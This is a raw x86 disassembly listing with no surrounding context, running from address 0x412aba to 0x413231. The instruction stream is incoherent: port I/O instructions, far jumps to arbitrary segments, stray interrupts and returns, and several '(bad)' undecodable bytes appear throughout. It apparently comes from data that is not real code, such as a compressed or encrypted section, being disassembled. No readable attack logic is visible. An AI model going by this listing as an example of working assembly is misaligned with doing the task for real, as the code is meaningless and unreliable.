  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	dec    esi
  412abc:	xor    dl,0x1
  412abf:	addr16 ds and esi,esp
  412ac3:	xor    esi,DWORD PTR [ebp-0x74fb3a6e]
  412ac9:	mov    esi,DWORD PTR [edi+0x21]
  412acc:	or     BYTE PTR [esi-0x52],ah
  412acf:	lods   al,BYTE PTR ds:[esi]
  412ad0:	dec    esi
  412ad1:	mov    ebx,0x867015a0
  412ad6:	jne    0x412a7b
  412ad8:	mov    ch,0xe1
  412ada:	iret   
  412adb:	aas    
  412adc:	ja     0x412b09
  412ade:	shl    edx,1
  412ae0:	push   es
  412ae1:	mov    ch,0xff
  412ae3:	pop    ss
  412ae4:	aas    
  412ae5:	push   esp
  412ae6:	out    dx,eax
  412ae7:	xchg   ecx,eax
  412ae8:	or     eax,0xe3674c14
  412aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aee:	fld    QWORD PTR [ecx-0x4f4567bf]
  412af4:	stos   BYTE PTR es:[edi],al
  412af5:	int3   
  412af6:	in     eax,0x2c
  412af8:	mov    bl,0xf8
  412afa:	or     DWORD PTR [edx-0xb],ebx
  412afd:	in     al,dx
  412afe:	pop    es
  412aff:	sub    BYTE PTR [edi+edx*1-0x416a1fbc],0xf6
  412b07:	xor    esp,ebx
  412b09:	pop    ecx
  412b0a:	test   al,0xba
  412b0c:	mov    BYTE PTR [ebx],bh
  412b0e:	cmp    edi,DWORD PTR ds:0x394f6e0f
  412b14:	fs pop ebx
  412b16:	xor    DWORD PTR ds:0xdcb31ef,esp
  412b1c:	and    eax,0x319b36c6
  412b21:	add    ah,ch
  412b23:	mov    eax,0xb0be285e
  412b28:	push   cs
  412b29:	or     dh,BYTE PTR [ebp+0x584e4733]
  412b2f:	push   es
  412b30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b31:	retf   
  412b32:	or     edi,ebp
  412b34:	stos   BYTE PTR es:[edi],al
  412b35:	sub    BYTE PTR [esi-0x73],0x0
  412b39:	mov    ebp,0xd5f05d60
  412b3e:	idiv   BYTE PTR [eax]
  412b40:	pop    ecx
  412b41:	in     eax,0x51
  412b43:	inc    esi
  412b44:	clc    
  412b45:	retf   
  412b46:	mov    ss,WORD PTR [eax+0x40a517f5]
  412b4c:	loope  0x412b56
  412b4e:	mov    WORD PTR [ebx-0x5bd0c688],es
  412b54:	jns    0x412b91
  412b56:	push   cs
  412b57:	push   esi
  412b58:	adc    eax,0xb51f1f44
  412b5d:	pop    ebx
  412b5e:	nop
  412b5f:	stos   DWORD PTR es:[edi],eax
  412b60:	call   0xfa520ef1
  412b65:	jo     0x412b50
  412b67:	pop    eax
  412b68:	add    esi,DWORD PTR [ecx+0x110a38bc]
  412b6e:	add    edx,esp
  412b70:	fdivr  DWORD PTR [eax-0x56]
  412b73:	xchg   ebp,eax
  412b74:	cmc    
  412b75:	xor    ebp,DWORD PTR [ecx]
  412b77:	jo     0x412b43
  412b79:	push   0x3bc8e0be
  412b7e:	outs   dx,DWORD PTR ds:[esi]
  412b7f:	push   esp
  412b80:	imul   ecx,DWORD PTR ds:0x3dd42ab8,0xffffffb6
  412b87:	sub    ebp,DWORD PTR [esi+0x3d]
  412b8a:	xor    eax,0x2a6baaf3
  412b8f:	xor    DWORD PTR [eax+0x62],0x73f3e89c
  412b96:	xchg   edx,eax
  412b97:	cmp    bl,bl
  412b99:	dec    ebx
  412b9a:	int    0x5e
  412b9c:	pop    edi
  412b9d:	stos   BYTE PTR es:[edi],al
  412b9e:	dec    edx
  412b9f:	xchg   edi,eax
  412ba0:	not    BYTE PTR [ebp+edi*8+0x26eb41d3]
  412ba7:	rcl    BYTE PTR [esi+0x3f],cl
  412baa:	popf   
  412bab:	dec    ecx
  412bac:	add    eax,0xf5c80874
  412bb1:	adc    edi,DWORD PTR [edi]
  412bb3:	push   0xc2c4d155
  412bb8:	mov    eax,0x5e5d21af
  412bbd:	xor    DWORD PTR [edx-0x19cb43d5],edx
  412bc3:	js     0x412bfa
  412bc5:	mov    eax,ds:0xde01de34
  412bca:	mov    ebx,0x6e5ec05
  412bcf:	mov    ds:0xc61934f5,al
  412bd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bd5:	cmp    eax,0xc42fbed7
  412bda:	imul   BYTE PTR [edi-0x4b]
  412bdd:	and    DWORD PTR [ebp+0x15],0x70
  412be1:	adc    DWORD PTR [esi+0x6f2ffdff],0x55f006d2
  412beb:	retf   
  412bec:	push   eax
  412bed:	dec    ecx
  412bee:	cdq    
  412bef:	cmp    BYTE PTR [eax+0x38e2dd8a],bh
  412bf5:	adc    al,0x34
  412bf7:	inc    DWORD PTR ss:[edi]
  412bfa:	jp     0x412bdd
  412bfc:	pop    edx
  412bfd:	jae    0x412c34
  412bff:	cmp    DWORD PTR [ecx],ecx
  412c01:	or     eax,0xe249c5f8
  412c06:	fdivr  DWORD PTR [eax]
  412c08:	sub    edx,DWORD PTR [edi]
  412c0a:	lock and ah,0xa6
  412c0e:	push   ds
  412c0f:	fprem1 
  412c11:	mov    esi,0xcb2ae696
  412c16:	xchg   esp,eax
  412c17:	sub    eax,0xe3cc384c
  412c1c:	shl    al,1
  412c1e:	sbb    ah,BYTE PTR [esi-0xd9174fe]
  412c24:	rol    BYTE PTR [ecx+0x646fef3d],cl
  412c2a:	into   
  412c2b:	cmp    BYTE PTR [ecx],dl
  412c2d:	enter  0x6f32,0x37
  412c31:	clc    
  412c32:	sbb    BYTE PTR [ebx+0x58de2af5],bh
  412c38:	and    dl,BYTE PTR [ecx+0x28]
  412c3b:	sbb    al,0x82
  412c3d:	imul   esi,DWORD PTR [eax+edi*1+0x6ff2a711],0xffffffaa
  412c45:	stos   DWORD PTR es:[edi],eax
  412c46:	inc    esi
  412c47:	push   cs
  412c48:	adc    DWORD PTR [esi+0x6e],ebx
  412c4b:	inc    eax
  412c4c:	jne    0x412c85
  412c4e:	enter  0xf9ae,0x64
  412c52:	dec    esp
  412c53:	cmp    ecx,ebp
  412c55:	push   esp
  412c56:	sbb    DWORD PTR ds:0x7504758b,esp
  412c5c:	call   0x2dd1b4d7
  412c61:	rcl    DWORD PTR [ebx+0x71],0x35
  412c65:	cmp    eax,0x4d138e7
  412c6a:	shl    BYTE PTR [ebx-0x5e],1
  412c6d:	and    esi,esp
  412c6f:	jae    0x412c66
  412c71:	test   BYTE PTR [edx],ch
  412c73:	add    dl,BYTE PTR [ebp+esi*2+0x38015fae]
  412c7a:	sahf   
  412c7b:	add    ah,BYTE PTR [ecx-0x38]
  412c7e:	inc    edx
  412c7f:	daa    
  412c80:	xchg   ebx,eax
  412c81:	dec    edi
  412c82:	outs   dx,DWORD PTR ds:[esi]
  412c83:	pop    es
  412c84:	ins    BYTE PTR es:[edi],dx
  412c85:	mov    al,0xc9
  412c87:	fwait
  412c88:	lds    ebp,FWORD PTR [edx+0x2]
  412c8b:	cmp    al,0x9
  412c8d:	lea    ecx,[ecx+0x4a]
  412c90:	mov    ebp,0x5df11fa1
  412c95:	daa    
  412c96:	lods   al,BYTE PTR ds:[esi]
  412c97:	fcom   DWORD PTR [edi]
  412c99:	fwait
  412c9a:	pusha  
  412c9b:	iret   
  412c9c:	out    dx,al
  412c9d:	je     0x412c9a
  412c9f:	sar    DWORD PTR ss:[ecx],1
  412ca2:	push   ds
  412ca3:	cmp    DWORD PTR ds:0x9f2b3ea7,ecx
  412ca9:	outs   dx,DWORD PTR gs:[esi]
  412cab:	pop    es
  412cac:	mov    dh,0x6
  412cae:	push   0xa9c8ef47
  412cb3:	cmp    BYTE PTR [ecx],bl
  412cb5:	pop    edi
  412cb6:	arpl   bx,bx
  412cb8:	adc    DWORD PTR [ebx],edx
  412cba:	add    ch,BYTE PTR [ecx-0x18]
  412cbd:	mov    bh,0x26
  412cbf:	sbb    ah,BYTE PTR [edx]
  412cc1:	pushf  
  412cc2:	and    ebx,DWORD PTR [ecx-0xa]
  412cc5:	pop    esp
  412cc6:	sar    DWORD PTR [eax],1
  412cc8:	std    
  412cc9:	jb     0x412c6c
  412ccb:	cs int3 
  412ccd:	outs   dx,BYTE PTR ds:[esi]
  412cce:	mov    ebp,DWORD PTR [esi+esi*8-0x75]
  412cd2:	loop   0x412cf6
  412cd4:	das    
  412cd5:	add    esp,DWORD PTR [esi]
  412cd7:	or     dl,ch
  412cd9:	lods   al,BYTE PTR ds:[esi]
  412cda:	adc    eax,0x417d293e
  412cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce0:	xchg   edi,eax
  412ce1:	ins    BYTE PTR es:[edi],dx
  412ce2:	xchg   eax,ecx
  412ce4:	add    DWORD PTR [esi+0x3f9ccc85],esi
  412cea:	add    DWORD PTR [ecx-0x5604a64b],0x2f
  412cf1:	mov    ah,0xd6
  412cf3:	xor    esp,esi
  412cf5:	sbb    al,0x64
  412cf7:	sahf   
  412cf8:	pop    eax
  412cf9:	sub    BYTE PTR [edx],al
  412cfb:	jmp    0x412c94
  412cfd:	push   edx
  412cfe:	outs   dx,DWORD PTR ds:[esi]
  412cff:	xor    bh,al
  412d01:	mov    eax,ds:0xd7cf7a80
  412d06:	int    0x33
  412d08:	enter  0xd103,0x33
  412d0c:	mov    ebx,0x263c4d6b
  412d11:	inc    ebp
  412d12:	outs   dx,DWORD PTR ds:[esi]
  412d13:	push   eax
  412d14:	lods   al,BYTE PTR ds:[esi]
  412d15:	xchg   edi,eax
  412d16:	add    al,0x12
  412d18:	xor    DWORD PTR [esi],edx
  412d1a:	out    dx,al
  412d1b:	cmp    bl,cl
  412d1d:	dec    eax
  412d1e:	stos   BYTE PTR es:[edi],al
  412d1f:	jmp    0xa1d5:0x98c2ff6e
  412d26:	outs   dx,BYTE PTR ds:[esi]
  412d27:	dec    esp
  412d28:	push   esp
  412d29:	cdq    
  412d2a:	cld    
  412d2b:	lods   eax,DWORD PTR ds:[esi]
  412d2c:	mov    edi,0x62390b6a
  412d31:	fcom   DWORD PTR [ecx+0x68827a09]
  412d37:	into   
  412d38:	cmc    
  412d39:	in     al,dx
  412d3a:	push   eax
  412d3b:	dec    ecx
  412d3c:	add    eax,DWORD PTR [edi-0x29]
  412d3f:	mov    bh,0xa0
  412d41:	imul   esp,DWORD PTR [ebp+0x3d],0xffffffc7
  412d45:	dec    eax
  412d46:	push   esp
  412d47:	mov    ebp,0xdd84bb9c
  412d4c:	inc    esi
  412d4d:	xchg   ebx,eax
  412d4e:	outs   dx,BYTE PTR ds:[esi]
  412d4f:	outs   dx,BYTE PTR ds:[esi]
  412d50:	push   eax
  412d51:	push   edi
  412d52:	js     0x412db0
  412d54:	sbb    al,0x94
  412d56:	hlt    
  412d57:	cmp    eax,0x467c35f3
  412d5c:	jb     0x412d16
  412d5e:	cwde   
  412d5f:	mov    eax,0xaf6f5e92
  412d64:	add    DWORD PTR [ecx+0x3d],ecx
  412d67:	push   eax
  412d68:	sub    eax,0xcbf502d6
  412d6d:	inc    ebp
  412d6e:	mov    WORD PTR [edi+0x78],cs
  412d71:	clc    
  412d72:	maxps  xmm5,XMMWORD PTR [ebx-0xa077ca1]
  412d79:	jae    0x412df4
  412d7b:	call   0x3873:0xe2cc3ce4
  412d82:	test   al,0xe4
  412d84:	xor    ah,dl
  412d86:	lods   al,BYTE PTR ds:[esi]
  412d87:	dec    ebp
  412d88:	jne    0x412d9c
  412d8a:	outs   dx,BYTE PTR ds:[esi]
  412d8b:	and    al,0x31
  412d8d:	bound  edx,QWORD PTR [edx]
  412d8f:	fidivr WORD PTR [esi-0x60c6b3bd]
  412d95:	mov    ds:0x8cb5888e,al
  412d9a:	outs   dx,DWORD PTR ds:[esi]
  412d9b:	aam    0xf5
  412d9d:	add    dl,BYTE PTR [eax-0xe]
  412da0:	xchg   ebp,eax
  412da1:	pusha  
  412da2:	ja     0x412d6d
  412da4:	jg     0x412dd7
  412da6:	test   DWORD PTR [edx-0x27651637],0xc1c67285
  412db0:	cmc    
  412db1:	sub    DWORD PTR [ecx],eax
  412db3:	js     0x412d4d
  412db5:	out    0x2b,al
  412db7:	in     al,0xc7
  412db9:	cmp    edi,DWORD PTR [edx-0x4bf7bf35]
  412dbf:	hlt    
  412dc0:	js     0x412dd0
  412dc2:	outs   dx,BYTE PTR ds:[esi]
  412dc3:	pop    ds
  412dc4:	neg    DWORD PTR [edx-0x59]
  412dc7:	out    dx,al
  412dc8:	jne    0x412db3
  412dca:	cmp    WORD PTR [ebx+0x46],sp
  412dce:	mov    ds:0x508c9d76,al
  412dd3:	cmp    ch,al
  412dd5:	jmp    0x536f:0xa6cbcedd
  412ddc:	cli    
  412ddd:	xor    bl,BYTE PTR [ecx+edi*2+0x31]
  412de1:	jns    0x412ddb
  412de3:	xchg   ebx,eax
  412de4:	cmc    
  412de5:	inc    di
  412de7:	push   edi
  412de8:	xchg   esi,eax
  412de9:	inc    ecx
  412dea:	inc    eax
  412deb:	mov    esp,0x52cc3ba2
  412df0:	out    0x19,eax
  412df2:	jbe    0x412e52
  412df4:	aad    0x54
  412df6:	jle    0x412e63
  412df8:	sub    eax,0x2a38d447
  412dfd:	outs   dx,BYTE PTR ds:[esi]
  412dfe:	out    0xb0,al
  412e00:	(bad)
  412e04:	jmp    0x696b:0x4f2c8ebc
  412e0b:	dec    edx
  412e0c:	iret   
  412e0d:	sub    al,0x6f
  412e0f:	jo     0x412e3b
  412e11:	cmp    eax,0xf20dd852
  412e16:	test   DWORD PTR [edx-0x2a],edx
  412e19:	cmp    eax,esp
  412e1b:	aad    0xe5
  412e1d:	xchg   ebx,eax
  412e1e:	and    DWORD PTR [esi+0x1c6b4810],ebp
  412e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e25:	adc    DWORD PTR [eax+edx*2+0x75],esi
  412e29:	or     ah,BYTE PTR ds:0xe93bd0e8
  412e2f:	sbb    eax,0x881a59a3
  412e34:	pop    edx
  412e35:	xor    DWORD PTR [ebp+0x42],0x6e
  412e39:	rol    BYTE PTR [edi+0x1435c589],0x9
  412e40:	xor    edi,DWORD PTR [eax]
  412e42:	ret    0xb7d
  412e45:	shl    bl,cl
  412e47:	pop    ds
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	ret    
  412e4a:	outs   dx,BYTE PTR ds:[esi]
  412e4b:	sub    DWORD PTR [ecx+0x7926897f],ebx
  412e51:	mov    eax,0x3866c1ad
  412e56:	cdq    
  412e57:	in     eax,0x6e
  412e59:	add    al,0xa5
  412e5b:	daa    
  412e5c:	xchg   ebx,eax
  412e5d:	scas   al,BYTE PTR es:[edi]
  412e5e:	fcom   DWORD PTR [edx+0xe5e7014]
  412e64:	shr    BYTE PTR [ebx+0x3801ea3d],cl
  412e6a:	ja     0x412eb2
  412e6c:	sar    BYTE PTR [ebp-0x38],1
  412e6f:	adc    al,0xe
  412e71:	repnz mov ecx,0x621f1438
  412e77:	test   dl,ah
  412e79:	in     eax,dx
  412e7a:	outs   dx,BYTE PTR ds:[esi]
  412e7b:	daa    
  412e7c:	mov    DWORD PTR [ebp-0x1594f54b],ebx
  412e82:	xchg   BYTE PTR [eax],bh
  412e84:	push   eax
  412e85:	iret   
  412e86:	es mov ebx,0x8ffd2faa
  412e8c:	cmc    
  412e8d:	and    al,0xcb
  412e8f:	and    eax,0x2de7c726
  412e94:	push   es
  412e95:	cmp    BYTE PTR [esi],dh
  412e97:	popf   
  412e98:	cmp    BYTE PTR [eax+0x28],ah
  412e9b:	addr16 clc 
  412e9d:	outs   dx,DWORD PTR cs:[esi]
  412e9f:	sti    
  412ea0:	jg     0x412e78
  412ea2:	fwait
  412ea3:	inc    esp
  412ea4:	pushf  
  412ea5:	and    dh,BYTE PTR [esi]
  412ea7:	cmp    DWORD PTR [eax+0x18],edi
  412eaa:	pop    ss
  412eab:	fmul   QWORD PTR [ecx]
  412ead:	adc    esi,esp
  412eaf:	push   ebp
  412eb1:	jmp    0x8b5e9a4f
  412eb6:	inc    edx
  412eb7:	data16 mov BYTE PTR [ebx],bh
  412eba:	or     ecx,esi
  412ebc:	rol    ch,cl
  412ebe:	sbb    al,0xaf
  412ec0:	dec    esp
  412ec1:	lods   al,BYTE PTR ds:[si]
  412ec3:	stc    
  412ec4:	add    al,0x38
  412ec6:	inc    esp
  412ec7:	sub    DWORD PTR [eax-0x69],esi
  412eca:	call   0x605f:0x2d38ec80
  412ed1:	or     esp,DWORD PTR [ecx]
  412ed3:	dec    ebp
  412ed4:	and    BYTE PTR [edi],cl
  412ed6:	outs   dx,BYTE PTR ds:[esi]
  412ed7:	scas   al,BYTE PTR es:[edi]
  412ed8:	test   BYTE PTR [esi+0x16],bh
  412edb:	addr16 int 0xb0
  412ede:	in     eax,dx
  412edf:	push   esi
  412ee0:	push   esi
  412ee1:	cmp    esi,DWORD PTR [edx]
  412ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee4:	jmp    0x412f5b
  412ee6:	jns    0x412f0a
  412ee8:	clc    
  412ee9:	(bad)  [edi]
  412eeb:	xor    ch,0xf
  412eee:	ret    
  412eef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ef0:	lock test al,0x39
  412ef3:	lahf   
  412ef4:	(bad)  
  412ef5:	cmp    ecx,ebp
  412ef7:	mov    esp,0x14da773f
  412efc:	xchg   BYTE PTR [esi+ebp*2-0x76d6a8bc],ah
  412f03:	ret    
  412f04:	pop    ds
  412f05:	es push ebx
  412f07:	and    edx,DWORD PTR [ebx]
  412f09:	push   esp
  412f0b:	cmp    BYTE PTR [ebx+0x2d37d978],al
  412f11:	shr    BYTE PTR [esi-0xe],1
  412f14:	adc    al,0x31
  412f16:	push   ebp
  412f17:	add    DWORD PTR [edx-0x1ec3b767],edi
  412f1d:	ds xchg edx,eax
  412f1f:	jle    0x412f09
  412f21:	in     al,0x56
  412f23:	pop    edx
  412f24:	xchg   esp,eax
  412f25:	xchg   ecx,eax
  412f26:	outs   dx,BYTE PTR ds:[esi]
  412f27:	cmp    cl,bl
  412f29:	mov    bl,0xc4
  412f2b:	ror    ch,cl
  412f2d:	push   esp
  412f2e:	enter  0xff38,0x15
  412f32:	pop    ss
  412f33:	mov    ebp,0x9461df08
  412f38:	call   0x2af46a63
  412f3d:	xchg   BYTE PTR [esi],ah
  412f3f:	sub    edi,0xad22cf17
  412f45:	pop    edi
  412f46:	push   eax
  412f47:	cmp    DWORD PTR ds:0x57271c0e,ebp
  412f4d:	push   edx
  412f4e:	loope  0x412f00
  412f50:	call   0xdb7377b8
  412f55:	popa   
  412f56:	jae    0x412f08
  412f58:	lods   eax,DWORD PTR ds:[esi]
  412f59:	repnz and cl,BYTE PTR [ecx-0x77]
  412f5d:	or     DWORD PTR [esi+eax*2-0xab16d5e],esp
  412f64:	out    0xdf,eax
  412f66:	and    eax,DWORD PTR [esi+0x2ae9a5ef]
  412f6c:	mov    ecx,0x750a838f
  412f71:	ds fwait
  412f73:	out    dx,al
  412f74:	push   cs
  412f75:	sahf   
  412f76:	xor    al,0x1b
  412f78:	in     eax,0x48
  412f7a:	inc    edx
  412f7b:	cmp    DWORD PTR [ecx],esi
  412f7d:	enter  0xa3c7,0xd8
  412f81:	retf   0xcd7d
  412f84:	out    dx,al
  412f85:	mov    edi,0xa6338d5
  412f8a:	shr    DWORD PTR [eax+0xf],0x3b
  412f8e:	pop    ecx
  412f8f:	sbb    DWORD PTR [edx+0x34af0b90],esi
  412f95:	dec    eax
  412f96:	cmp    edi,esi
  412f98:	neg    dh
  412f9a:	sbb    al,0x48
  412f9c:	xchg   edx,eax
  412f9d:	daa    
  412f9e:	ret    0x4563
  412fa1:	mov    dl,0x6f
  412fa3:	cmp    BYTE PTR [edx-0x22c5d54c],ch
  412fa9:	in     eax,dx
  412faa:	mov    edx,0xa77bf5b9
  412faf:	mov    BYTE PTR ds:0xbedf0712,dh
  412fb5:	cmp    al,0x72
  412fb7:	xor    BYTE PTR ds:0xf6aebc2b,bl
  412fbd:	mov    BYTE PTR [edx+0x55],al
  412fc0:	push   cs
  412fc1:	inc    edi
  412fc2:	or     ecx,ebx
  412fc4:	mov    eax,ds:0xf3fa82f2
  412fc9:	test   BYTE PTR [esi-0x57],ch
  412fcc:	loopne 0x41301d
  412fce:	push   esp
  412fcf:	jb     0x413045
  412fd1:	enter  0xb375,0xb5
  412fd5:	(bad)  
  412fd6:	or     esp,esi
  412fd8:	lds    eax,FWORD PTR [eax]
  412fda:	xchg   ebx,eax
  412fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fdc:	mov    bh,0x37
  412fde:	pop    eax
  412fdf:	pop    ebx
  412fe0:	clc    
  412fe1:	and    DWORD PTR [ebp-0x57],edi
  412fe4:	cmc    
  412fe5:	push   edx
  412fe6:	repnz out 0xa2,eax
  412fe9:	xchg   edi,eax
  412fea:	into   
  412feb:	outs   dx,DWORD PTR ds:[esi]
  412fec:	sbb    DWORD PTR [eax],edi
  412fee:	std    
  412fef:	dec    eax
  412ff0:	mov    eax,0x297285c8
  412ff5:	xchg   ebp,eax
  412ff6:	fbld   TBYTE PTR [esi*8-0x3f5cd510]
  412ffd:	ds in  al,dx
  412fff:	mov    eax,0x13993874
  413004:	leave  
  413005:	push   es
  413006:	gs xor eax,0x9ba202c5
  41300c:	loop   0x413046
  41300e:	jo     0x413040
  413010:	(bad)  
  413011:	jbe    0x41306c
  413013:	in     al,dx
  413014:	sti    
  413015:	cmp    esi,eax
  413017:	mov    ds:0xc14ab1b,al
  41301c:	sub    ecx,DWORD PTR [edx-0x28bcb892]
  413022:	test   al,0x77
  413024:	cmp    al,0x34
  413026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413027:	dec    edx
  413028:	push   ebp
  413029:	cmp    ebx,DWORD PTR [esi+ebp*4-0x11]
  41302d:	lock ror DWORD PTR [eax+ebx*1+0x4c],0x9a
  413033:	ret    0x70f5
  413036:	jbe    0x412ff4
  413038:	outs   dx,BYTE PTR ds:[esi]
  413039:	jl     0x41301b
  41303b:	clc    
  41303c:	dec    edi
  41303d:	xor    ch,BYTE PTR [ecx]
  41303f:	mov    ecx,0xf8027df3
  413044:	ins    BYTE PTR es:[edi],dx
  413045:	push   esi
  413046:	jno    0x413064
  413048:	pop    esp
  413049:	icebp  
  41304a:	psubsw mm4,QWORD PTR [ebx-0x131169fc]
  413051:	push   ebp
  413052:	call   0xff209ca0
  413057:	icebp  
  413058:	mov    al,0xbd
  41305a:	popa   
  41305b:	cmp    DWORD PTR [edx-0x495aa972],esp
  413061:	xor    ebx,DWORD PTR [ebx+0x6e]
  413064:	cmc    
  413065:	clc    
  413066:	fsub   DWORD PTR [edx]
  413068:	mov    esp,0xc412f8dc
  41306d:	cmp    ebx,esi
  41306f:	lods   eax,DWORD PTR ds:[esi]
  413070:	sub    dh,BYTE PTR [edi-0x18afa8af]
  413076:	outs   dx,BYTE PTR ds:[esi]
  413077:	xchg   edx,eax
  413078:	mov    DWORD PTR [ecx*8-0x763cc5b4],ecx
  41307f:	cmp    BYTE PTR [edi+ebp*2+0x7ec2e52f],ah
  413086:	lds    esp,FWORD PTR [esi]
  413088:	in     al,dx
  413089:	jbe    0x41303c
  41308b:	or     dl,BYTE PTR [edi+edi*1-0x530189e2]
  413092:	inc    ebp
  413093:	cmp    ecx,eax
  413095:	(bad)  
  413096:	sahf   
  413097:	out    0x19,eax
  413099:	sbb    al,0x2a
  41309b:	and    bh,dh
  41309d:	or     al,BYTE PTR [esi]
  41309f:	cmp    BYTE PTR [eax-0x30],ch
  4130a2:	repz fcom DWORD PTR [esi+0x1b387754]
  4130a9:	or     DWORD PTR [eax+0x76],0xffffffe6
  4130ad:	test   DWORD PTR [edi],0xd2a1f5e0
  4130b3:	fisubr DWORD PTR [ebx+0x46472b9e]
  4130b9:	cmp    eax,0xe3eec885
  4130be:	pop    es
  4130bf:	add    esi,edx
  4130c1:	mov    eax,esp
  4130c3:	push   ss
  4130c4:	mov    ch,0x18
  4130c6:	dec    edx
  4130c7:	(bad)  
  4130c9:	cmp    edi,DWORD PTR [eax+0x3b6104b1]
  4130cf:	push   0xffffffdf
  4130d1:	or     al,0x6e
  4130d3:	sbb    bh,BYTE PTR [ecx+0x0]
  4130d6:	outs   dx,DWORD PTR ds:[esi]
  4130d7:	and    bh,BYTE PTR [edi+0x7ab81f80]
  4130dd:	cmp    BYTE PTR [ebp+0x7bdff2ef],al
  4130e3:	xlat   BYTE PTR ds:[ebx]
  4130e4:	xor    esp,DWORD PTR [ebp+0x6f]
  4130e7:	test   DWORD PTR [ebp-0x9],ecx
  4130ea:	stos   BYTE PTR es:[edi],al
  4130eb:	ret    0x9275
  4130ee:	lods   eax,DWORD PTR ds:[esi]
  4130ef:	cmp    bl,dh
  4130f1:	or     eax,0xaecf998f
  4130f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130f7:	in     al,dx
  4130f8:	neg    BYTE PTR [ebx+eiz*2]
  4130fb:	mov    edx,0x37c6ba8a
  413100:	lods   eax,DWORD PTR ds:[esi]
  413101:	outs   dx,DWORD PTR ds:[esi]
  413102:	(bad)  
  413103:	cmp    dl,bl
  413105:	out    dx,al
  413106:	or     al,0xc8
  413108:	mov    bl,0x83
  41310a:	leave  
  41310b:	push   ecx
  41310c:	cmc    
  41310d:	pop    ecx
  41310e:	rcl    DWORD PTR [ebx],1
  413110:	pop    es
  413111:	and    dl,bh
  413113:	out    0xf9,al
  413115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413116:	jmp    0xe87243db
  41311b:	iret   
  41311c:	add    al,0x26
  41311e:	lea    edi,[eax]
  413120:	test   eax,0x3fc36792
  413126:	outs   dx,BYTE PTR ds:[esi]
  413127:	int    0xf
  413129:	ret    
  41312a:	sti    
  41312b:	xlat   BYTE PTR ds:[ebx]
  41312c:	fisubr DWORD PTR [ebx+ebp*8+0x38]
  413130:	jge    0x413126
  413132:	mov    gs,WORD PTR [bx-0x55]
  413136:	xchg   ebx,eax
  413137:	dec    eax
  413138:	adc    edx,DWORD PTR [ecx+ecx*8-0x66]
  41313c:	outs   dx,BYTE PTR ds:[esi]
  41313d:	sub    cl,BYTE PTR [edx]
  41313f:	mov    ecx,0x4fd4b43d
  413144:	jae    0x41314a
  413146:	lods   eax,DWORD PTR ds:[esi]
  413147:	push   edi
  413148:	cdq    
  413149:	mov    ebx,0xe5dc400d
  41314e:	shl    BYTE PTR [esi+0x79],1
  413151:	shr    BYTE PTR [esi-0x59],0xa4
  413155:	push   ecx
  413156:	jg     0x41317a
  413158:	imul   ch
  41315a:	xchg   edi,eax
  41315b:	rol    DWORD PTR [eax],0x38
  41315e:	cmp    eax,DWORD PTR [esi-0x49]
  413161:	mov    ds:0x7f821cbe,al
  413166:	outs   dx,DWORD PTR ds:[esi]
  413167:	sbb    BYTE PTR [edi],0xc3
  41316a:	mov    ah,0xd5
  41316c:	jns    0x41311c
  41316e:	sar    BYTE PTR [ecx],cl
  413170:	ins    BYTE PTR es:[edi],dx
  413171:	pop    ss
  413172:	jb     0x41319c
  413174:	rcl    DWORD PTR [ebx+ebx*8+0x7ddbe244],1
  41317b:	cld    
  41317c:	mov    edi,0xc0a8181b
  413181:	sbb    eax,DWORD PTR [edi+edi*2+0xc]
  413185:	in     eax,dx
  413186:	retf   
  413187:	sub    esp,DWORD PTR [edx]
  413189:	inc    edx
  41318a:	cwde   
  41318b:	es xor eax,0x9d0304c5
  413191:	int    0x6e
  413193:	push   0x3b59ffa7
  413198:	push   ds
  413199:	mov    edx,0x3bd8c5b0
  41319e:	mov    eax,ds:0x55b57cd5
  4131a3:	(bad)  
  4131a5:	test   DWORD PTR [ecx+edx*2-0x6343f912],ecx
  4131ac:	xchg   esp,eax
  4131ad:	pop    edx
  4131ae:	adc    esp,eax
  4131b0:	sar    ecx,cl
  4131b2:	ss stos BYTE PTR es:[edi],al
  4131b4:	sar    BYTE PTR [ebx],cl
  4131b6:	inc    esp
  4131b7:	mov    ecx,0x6966ce7d
  4131bc:	mov    ecx,0xe9024888
  4131c1:	es mov dl,0x98
  4131c4:	jmp    0x4f56:0x34052eb3
  4131cb:	cmp    DWORD PTR [edi-0x2ba80432],ebp
  4131d1:	xchg   DWORD PTR [ebx+0x415cf5bb],eax
  4131d7:	stos   BYTE PTR es:[edi],al
  4131d8:	hlt    
  4131d9:	push   ss
  4131da:	mov    bl,0xcf
  4131dc:	pushf  
  4131dd:	cmp    ebp,DWORD PTR [ecx+0x2928a0cd]
  4131e3:	sbb    BYTE PTR [ebx],bl
  4131e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131e6:	outs   dx,BYTE PTR ds:[esi]
  4131e7:	lea    eax,[ecx]
  4131e9:	enter  0x79e1,0x32
  4131ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ee:	inc    ebx
  4131ef:	cmp    DWORD PTR [esi],edi
  4131f1:	pop    ecx
  4131f2:	popa   
  4131f3:	mov    edi,0x92a6fc0
  4131f8:	repz add eax,0xf763a56e
  4131fe:	mov    ebx,0x2680ca64
  413203:	xor    al,0xa
  413205:	imul   esi,ecx,0x6a647dcd
  41320b:	sub    bl,ch
  41320d:	out    0xe2,al
  41320f:	mov    eax,ds:0x72119002
  413214:	push   ss
  413215:	cmp    BYTE PTR [edx-0x58a82f51],cl
  41321b:	into   
  41321c:	ins    BYTE PTR es:[edi],dx
  41321d:	push   ds
  41321e:	outs   dx,BYTE PTR ds:[esi]
  41321f:	inc    ebx
  413220:	repnz sbb eax,0xd0a58097
  413226:	push   ss
  413227:	adc    eax,0x1926c559
  41322c:	fwait
  41322d:	cmp    ebx,ecx
  41322f:	push   esi
  413230:	das    
  413231:	fwait
